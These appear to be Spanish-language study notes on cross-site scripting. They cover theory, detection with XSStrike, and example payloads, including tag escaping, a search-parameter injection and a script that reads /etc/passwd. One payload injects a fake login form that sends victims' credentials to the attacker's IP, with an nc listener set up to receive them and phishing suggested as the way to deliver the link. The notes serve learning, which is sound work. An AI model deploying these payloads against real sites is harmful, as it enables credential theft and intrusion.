# XSS

## REFERENCIAS WEB

+ https://www.youtube.com/watch?v=iAZsBOXtyDg
+ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+ https://portswigger.net/web-security/cross-site-scripting/exploiting

## TEORIA

### ¿QUÉ ES EL XSS?

+ Son las siglas de Cross Site Scripting 
+ Ocurre cuando podemos inyectar código
  JavaScript en una web. Esto se ejecuta en el
lado del cliente 
+ El vector de ataque posible de un XSS se da
  en entradas de usuario no sanitizadas.
(formularios, campos de busqueda, parametros
url...)

### TIPOS COMUNES

+ **REFLECTED**: El atacante puede ver una
  reacción inmediata en respuesta a la
inyección.
 
+ **STORED**: El payload malicioso queda
  almacenado en la base de datos o en el
servidor. Cuando un usuario accede a la
información afectada (por ejemplo, un
comentario o perfil), el código se carga y se
ejecuta automáticamente en su navegador.

## DIAGNOSTICO

### DIAGNOSTICO MANUAL

Cuando exista sospecha de que un input puede ser vulnerable a un XSS reflejado, podemos probar el payload más básico: 

```js
<script>alert(1)</script>
```

### DIAGNOSTICO AUTOMATICO

Podemos utilizar la herramienta XSSstrike ante el endpoint que creemos que es vulnerable ante un XSS. 
https://github.com/s0md3v/XSStrike

Se trata de un script en python. Para usarlo: 
```bash
python3 xsstrike.py -u http://web.com/endpoint
```
## EJEMPLOS DE ATAQUE

### EJEMPLOS DE ATAQUE REFLECTED
 
**CAMBIAR FONDO DE ESCRITORIO**
```js
<script>document.body.background+%3d+"http://10.10.10.10/gatito.jpg"</script>

```
Y por el otro lado levantas un servidor simple
en python para hostear la imagen.
```bash
python3 -m http.server 80
```
Esto se esta ejecutando solamente en el navegador, hay que entender eso. 

**CREAR UN FALSO FORMULARIO DE INICIO DE SESIÓN FALSO**
```html
<script>
    document.write('
<form action="http://nuestraIP">
        <h3>Please Login to Continue</h3>
        <input type="username" name="username" placeholder="Username">
        <input type="password" name="password" paceholder="Password">
        <input type="submit" name="submit" value="Login">
</form>');


')
</script>
``` 
Esto solo cambiara en TU navegador, la idea de
ataque aquí es pasarle la URL maliciosa a otro
usuario (vía phishing por ejemplo).  Lo que
hace básicamente el payload es crear un
formulario de inicio de sesión falso en el que
una vez que la victima introduzca sus
credenciales y le de a submit, estas se nos
enviarán por HTTP GET.  De nuestro lado
tendremos que habilitar un listener para
recibir la petición que contendrá la
información: 

```bash
nc -lvnp 80
``` 

**INYECCIÓN DE CÓDIGO CERRANDO TAG HTML**
A veces para inyectar un código como: 
```js
<script>alert(1)</script>
```
Tendrás que "escapar" de los tags HTML.  Por
ejemplo, imagina que puedes inyectar ese
código dentro de unas etiquetas title. Pero no
se interpreta por dichas etiquetas. Para
escaparlo puedes:

```js
</title><script>alert(1)</script>
```
Como ves has escapado la etiqueta title y
luego inyectado el código. 

**INYECCIÓN DE CÓDIGO ABUSANDO DE FUNCIÓN SEARCH**
Ante un endpoint del estilo /search?q=

```js
'%2Balert(1)%2B'
```


## EXPLOTACIÓN

Hasta ahora hemos visto diferentes maneras de lanzar ataques XSS.
Ahora vamos a ver como podemos aprovechar esta vulnerabilidad para
escalarla hacía algo más.

### EXPLOTANDO XSS PARA ROBAR COOKIS DE SESIÓN

Las cookies de sesión sirven para mantener identificado a un usuario en una sesión. Mediante un XSS podemos robar la cookie de sesión de un usuario legitimo, para hacernos pasar por él.
Esto tiene una serie de limitaciones: 
    + El usuario no debe estar logeado
    + La mayoría de aplicaciones esconden sus cookies de Js
      mediante la flag HttpOnly.
    + Las sesiones podrían estar bloqueadas por factores
      adicionales, como las dirección IP del usuario. 
    + La sesión podría expirar antes de que puedas interceptarla.
  

**XSS TO LFI (POR PROBAR)**

```js
<script>
    x = new XMLHttpRequest;
    x.onload = function () {
        document.write(this.responseText);
    };
    x.open('GET', 'file:///etc/passwd');
    x.send();
</script>
```

